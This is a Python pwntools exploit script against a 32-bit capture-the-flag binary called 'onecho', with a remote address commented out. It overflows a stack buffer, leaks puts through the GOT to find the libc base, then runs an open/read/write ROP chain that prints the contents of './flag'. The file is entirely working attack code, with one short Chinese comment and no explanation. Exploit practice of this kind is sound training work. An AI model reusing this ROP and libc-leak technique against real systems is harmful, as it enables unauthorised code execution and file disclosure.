#encoding:utf-8
from pwn import *
#context.log_level = 'debug'

r = process("./onecho")
#r = remote("182.116.62.85",24143)
elf = ELF("./onecho")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#libc = ELF("./libc.so.6")


payload = b'\x00'+b'a'*(0x10c-1)
payload += b'b'*0x4
payload += p32(0x08049022)+p32(0x0804C100)
payload += p32(elf.plt['puts'])+p32(0x08049022)+p32(elf.got['puts'])
payload += p32(elf.plt['read'])+p32(0x08049811)+p32(0)+p32(0x0804C350)+p32(0x100)
payload += p32(0x0804973F)
r.sendline(payload)
sleep(0.2)
r.send("./flag\x00\x00")

r.recvuntil("name:\n")
leak_addr = u32(r.recv(4))
libc_base = leak_addr - libc.sym['puts']

payload = b'\x00'+b'b'*(0x10c-1)
payload += b'c'*0x4
payload += p32(0x08049022)+p32(0x0804C600)
payload += p32(0x08049022)+p32(0x0)
payload += p32(libc_base+libc.sym['open'])+p32(0x08049812)+p32(0x0804C350)+p32(0)#这个p32(0)就是为了只读
payload += p32(elf.plt['read'])+p32(0x08049811)+p32(3)+p32(0x0804C600)+p32(0x100)
payload += p32(elf.plt['write'])+p32(0x08049811)+p32(1)+p32(0x0804C600)+p32(0x3000)
payload += p32(0x0804973F)

r.sendline(payload)

r.interactive()
